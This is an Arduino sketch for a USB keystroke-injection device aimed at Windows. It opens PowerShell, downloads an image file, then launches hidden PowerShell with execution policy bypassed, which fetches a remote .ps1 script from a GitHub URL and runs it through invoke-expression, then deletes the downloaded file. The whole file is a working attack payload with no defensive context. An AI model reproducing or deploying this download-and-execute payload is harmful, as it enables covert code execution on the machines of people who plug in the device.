#include <HIDKeyboard.h>
HIDKeyboard keyboard;

void setup() {
  keyboard.begin();
  delay(2000);
}

void loop() {
  keyboard.pressKey(GUI, 'x');  // open up powershell
  keyboard.releaseKey();
  delay(350);
  keyboard.pressKey('i');
  keyboard.releaseKey();
  delay(1500);

  keyboard.println("Invoke-WebRequest -Uri https://github.com/P-ict0/horsed/blob/main/france.png?raw=true -OutFile france.png;exit");

  delay(800);

  keyboard.pressKey(GUI, 'r');  // open up powershell

  delay(1500);

  keyboard.println("powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/P-ict0/horsed/main/francer.ps1?dl=1; invoke-expression $pl");

  delay(1500);

  keyboard.pressKey(GUI, 'x');  // open up powershell
  keyboard.releaseKey();
  delay(350);
  keyboard.pressKey('i');
  keyboard.releaseKey();
  delay(1500);

  keyboard.println("Remove-Item france.png;exit");

  while(1);
}
